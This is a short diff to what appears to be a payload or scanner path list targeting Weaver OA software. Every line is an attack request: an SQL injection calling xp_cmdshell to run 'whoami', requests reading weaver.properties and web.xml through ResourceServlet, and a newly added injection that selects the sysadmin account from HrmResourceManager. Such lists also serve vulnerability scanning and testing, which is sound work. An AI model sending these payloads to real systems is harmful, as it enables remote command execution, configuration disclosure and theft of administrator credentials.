@@ -13,3 +13,4 @@
 /Api/portal/elementEcodeAddon/getSqlData?sql=exec%20xp_cmd$shell%20%27whoami%27;
 /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties
 /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
+/Api/portal/elementEcodeAddon/getSqlData?sql=Select%20*%20from%20HrmResourceManager%20where%20loginid=%27sysadmin%27
